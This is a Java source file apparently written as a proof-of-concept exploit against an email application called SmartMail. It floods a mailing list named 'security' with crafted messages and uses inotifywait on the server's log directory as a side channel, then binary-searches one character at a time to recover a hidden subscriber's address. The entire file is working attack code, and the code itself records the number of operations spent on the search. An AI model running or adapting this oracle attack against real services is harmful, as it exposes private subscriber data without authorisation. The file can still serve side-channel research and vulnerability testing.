package smartemailproof;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author user
 */
public class Proof_INotify {

    public String logloc;
    
    //./mydir2/ MODIFY myfile2.txt
    public static void main(String[] args) throws IOException {

        new File("./snoop").mkdir();
        
        Proof_INotify test = new Proof_INotify();
        test.logloc = args[0];
        new File(test.logloc).mkdir();
        
        //test.runProc();
        //System.exit(1);
        test.begin("me", "security");
    }

    public void begin(String from, String mailing_list) throws IOException {
        //Address list for 'To' field
        List<String> addresses = new ArrayList<>();

        addresses.add(mailing_list);

        String subject = "anything";
        String body = "anything jack@smartmail.com ";

        SnoopResult snoopResult = null;
        String possible_secret = null;
        
        //First, send a message to the mailing list and observe the log file writes.
        begin_observing_log_file_write_sequence();
        submit_email(from, addresses, subject, body);
        snoopResult = stop_observing_log_writes();

        //Then get the list of public subscribers to the mailing list
        List<String> public_addresses = get_publicaddresses_of_mailinglist(mailing_list);

        // Set lower and upper bounds on the first char based on the position of the write to the
        // secret log file.
        final int secret_position = snoopResult.position_of_secret;
        String search_lowerbound = public_addresses.get(secret_position - 2);
        String search_upperbound = public_addresses.get(secret_position - 1);

        //Get the size of log output without a testing email added toTo list
        final int sizewithnotestaddress = snoopResult.sizeofoutput;
        
        int char_search_position = 0;
        String middle_address = "a";
        //Begin binary search procedures
	// Learn one letter of the secret at a time.  After learning each next letter, check to
        // see if the secret has been fully learned.
        do {

            // Binary search loop
            do {
		// Get the letter in the alphabetical middle between the current
                // lower- and upper-bounds.
                middle_address = calculate_middle_address(char_search_position,
                        middle_address,
                        search_lowerbound,
                        search_upperbound);
                ////System.out.println("m2" + middle_address);
                List<String> addresses_temp = new ArrayList<String>();
                addresses_temp.addAll(addresses);
                addresses_temp.add(middle_address);

                //Do attack, binary search step
                //Send message and record logging write sequence
                System.out.println("attempting:" + middle_address);
                begin_observing_log_file_write_sequence();
                submit_email(from, addresses_temp, subject, body);
                snoopResult = stop_observing_log_writes();

                //If this is the same, then our test email collided witht the secret, end the search
                if (snoopResult.sizeofoutput == sizewithnotestaddress) {
                    foundSecret(middle_address);
                }
                //Check if we observed secret packet with different size
                if (snoopResult.position_of_secret > secret_position) {
                    //If we saw big secret packet, then middle_term > secret
                    search_lowerbound = middle_address;
                } else {
                    //If we did not see big secret packet, then middle_term < secret
                    search_upperbound = middle_address;
                }

            // If lower- and upper-bound are adjacent (e.g., lower = ‘c’ and upper = ‘d’),
            // then we can stop because lowerbound is the next letter of the secret.
            } while (!are_adjacent(char_search_position, search_lowerbound, search_upperbound));

            
            //Do some twiddling based on if position of last test email address was observed above or below the secret
            String middleaddtemp = middle_address;
            middle_address = twiddlelasttestchar(char_search_position, snoopResult.position_of_secret, secret_position, middle_address);
            System.out.println("------------------found a letter:" + middle_address.charAt(middle_address.length() - 2) + "------------------");
            ////System.out.println("done:" + middle_address);

            char_search_position++;
            //Set new lower and aupper bound for next character
            search_lowerbound = setlowerbound(middleaddtemp, char_search_position);
            search_upperbound = setupperbound(middleaddtemp, char_search_position);

            possible_secret = middle_address;

            List<String> addresses_temp = new ArrayList<String>();
            addresses_temp.addAll(addresses);
            addresses_temp.add(middle_address);
            
            // Test the oracle to see if the secret prefix learned thus far is the whole secret.
            begin_observing_log_file_write_sequence();
            submit_email(from, addresses_temp, subject, body + " " + possible_secret);
            snoopResult = stop_observing_log_writes();
            if (snoopResult.sizeofoutput == sizewithnotestaddress) {
                foundSecret(middle_address);
            }

        } while (1 == 1);

        //If program terminated, we found the secret

    }

    Process process;

    private void begin_observing_log_file_write_sequence() throws IOException {


        try {
            String l = "begin";
            Files.write(Paths.get("snoop/inotifywatch"), l.getBytes(), StandardOpenOption.DELETE_ON_CLOSE);
        } catch (IOException e) {
            //exception handling left as an exercise for the reader
        }

        runProc();
        try {
            Thread.sleep(100);
        } catch (InterruptedException ex) {
            Logger.getLogger(Proof_INotify.class.getName()).log(Level.SEVERE, null, ex);
        }

    }



    private SnoopResult stop_observing_log_writes() {

        try {
            Thread.sleep(200);
        } catch (InterruptedException ex) {
            Logger.getLogger(Proof_INotify.class.getName()).log(Level.SEVERE, null, ex);
        }
        process.destroy();
        try {
            Thread.sleep(1000);
        } catch (InterruptedException ex) {
            Logger.getLogger(Proof_INotify.class.getName()).log(Level.SEVERE, null, ex);
        }

        SnoopResult sres = new SnoopResult();
        BufferedReader br = null;
        String strLine = "";
        int pos = 1;
        int secpos = -1;

        Iterator<String> iterator = inotoutput.iterator();
        while (iterator.hasNext()) {

            strLine = iterator.next();
            if (strLine.contains("addlog1.log")) {
                secpos = pos;
            }
            if (strLine.contains("addlog2.log")) {
                pos++;
            }

        }

        sres.position_of_secret = secpos;
        sres.sizeofoutput = pos;
        return sres;
    }

    public static int ops = 0;
    
    private void submit_email(String from, List<String> addresses, String subject, String body) {

        List<String> to = new ArrayList();
        to.add("security");
        to.add("security");
        to.add("abc");
        MakeHTTPRequest.sendEmail(from, addresses, subject, body);
        ops++;

    }
    

    private List<String> get_publicaddresses_of_mailinglist(String mailing_list) {

        List<String> mlist = MakeHTTPRequest.getMList(mailing_list);
        ops++;
        return mlist;
        
    }

    private String calculate_middle_address(int char_search_position, String middle_address, String search_lowerbound, String search_upperbound) {
        char[] toCharArray = middle_address.toCharArray();

        char b = search_lowerbound.charAt(char_search_position);
        char e = search_upperbound.charAt(char_search_position);

        int bb = (int) b;
        int eb = (int) e;
        int r = eb - bb;
        int diff = r / 2;
        char newchar = (char) (diff + bb);

        toCharArray[char_search_position] = newchar;

        String newmiddle = new String(toCharArray);
        return newmiddle;
    }

    private boolean are_adjacent(int char_search_position, String search_lowerbound, String search_upperbound) {

        char b = search_lowerbound.charAt(char_search_position);
        char e = search_upperbound.charAt(char_search_position);

        int bb = (int) b;
        int eb = (int) e;
        int r = eb - bb;
        if (r <= 1) {
            return true;
        }

        return false;
    }

    private String twiddlelasttestchar(int testingpos, int observed_position_of_secret, int secret_position, String middle_address) {

        if (observed_position_of_secret > secret_position) {
            //If we saw big secret packet, then middle_term > secret
            
            System.out.println("case 1:"+middle_address);
            char[] toCharArray = middle_address.toCharArray();
            char testch = toCharArray[testingpos];
            int testchval = (int) testch;
            //testchval = testchval - 1;
            testch = (char) testchval;
            toCharArray[testingpos] = testch;

            String setmiddlebound = setmiddlebound(new String(toCharArray), testingpos);
            return setmiddlebound;
        } else {
            System.out.println("case 2:"+middle_address);
            //If we did not see big secret packet, then middle_term < secret
            char[] toCharArray = middle_address.toCharArray();
            char testch = toCharArray[testingpos];
            int testchval = (int) testch;
            testchval = testchval - 1;
            testch = (char) testchval;
            toCharArray[testingpos] = testch;

            String setmiddlebound = setmiddlebound(new String(toCharArray), testingpos);
            return setmiddlebound;
        }

    }

    private String setmiddlebound(String middle_address, int char_search_position) {
        char[] toCharArray = middle_address.toCharArray();
        char[] newchararray = new char[toCharArray.length + 1];
        for (int i = 0; i < toCharArray.length; i++) {
            newchararray[i] = toCharArray[i];
        }
        newchararray[newchararray.length - 1] = 'm';

        return new String(newchararray);
    }

    private String setlowerbound(String middle_address, int char_search_position) {
        char[] toCharArray = middle_address.toCharArray();
        char[] newchararray = new char[toCharArray.length + 1];
        for (int i = 0; i < toCharArray.length; i++) {
            newchararray[i] = toCharArray[i];
        }
        newchararray[newchararray.length - 1] = 'a';

        return new String(newchararray);
    }

    private String setupperbound(String middle_address, int char_search_position) {
        char[] toCharArray = middle_address.toCharArray();
        char[] newchararray = new char[toCharArray.length + 1];
        for (int i = 0; i < toCharArray.length; i++) {
            newchararray[i] = toCharArray[i];
        }
        int testchval = (int) 'z';
         testchval = testchval+1;
        newchararray[newchararray.length - 1] = (char)testchval;

        return new String(newchararray);
    }

    private void foundSecret(String middle_address) {
        System.out.println("The secret address:" + middle_address);
        System.out.println("total operations:" + ops);
        
        System.exit(1);
    }

    private class SnoopResult {

        int position_of_secret;
        private int sizeofoutput;
    }

    public static List<String> inotoutput;

    private void runProc() throws IOException {
        //System.out.println("start inotifywait");
        ProcessBuilder pb = new ProcessBuilder("inotifywait", "-m", "-e", "modify", logloc);

        List<String> command = pb.command();
                
        //System.out.println(command);
        process = pb.start();

// Start reading from the program
        final Scanner in = new Scanner(process.getErrorStream());
        new Thread() {
            public void run() {

                while (in.hasNextLine()) {
                    String nextLine = in.nextLine();
                    //System.out.println(nextLine);
                }
            }
        }.start();
        final Scanner in2 = new Scanner(process.getInputStream());
        new Thread() {
            public void run() {
                inotoutput = new ArrayList();
                while (in2.hasNextLine()) {
                    String line = in2.nextLine();
                    //System.out.println(line);
                    inotoutput.add(line);
                }
            }
        }.start();
        /*try {
         proc.waitFor();
         } catch (InterruptedException ex) {
         Logger.getLogger(TestINotify.class.getName()).log(Level.SEVERE, null, ex);
         }*/
        //System.out.println("done inotifywait");
    }
    
    
    private void begin_observing_log_file_write_sequenceX() throws IOException {


        try {
            String l = "begin";
            Files.write(Paths.get(logloc), l.getBytes(), StandardOpenOption.DELETE_ON_CLOSE);
        } catch (IOException e) {
            //exception handling left as an exercise for the reader
        }


    }



    private SnoopResult stop_observing_log_writesX() throws FileNotFoundException, IOException {

        try {
            Thread.sleep(1000);
        } catch (InterruptedException ex) {
            Logger.getLogger(Proof_INotify.class.getName()).log(Level.SEVERE, null, ex);
        }
 	FileInputStream fis = new FileInputStream(logloc);
 
	//Construct BufferedReader from InputStreamReader
	BufferedReader br = new BufferedReader(new InputStreamReader(fis));
 
        inotoutput = new ArrayList();
	String line = null;
	while ((line = br.readLine()) != null) {
		inotoutput.add(line);
	}
        br.close();
 
        


        SnoopResult sres = new SnoopResult();

        String strLine = "";
        int pos = 1;
        int secpos = -1;

        Iterator<String> iterator = inotoutput.iterator();
        while (iterator.hasNext()) {

            strLine = iterator.next();
            if (strLine.contains("addlog1.log")) {
                secpos = pos;
            }
            if (strLine.contains("addlog2.log")) {
                pos++;
            }

        }

        sres.position_of_secret = secpos;
        sres.sizeofoutput = pos;
        return sres;
    }

}
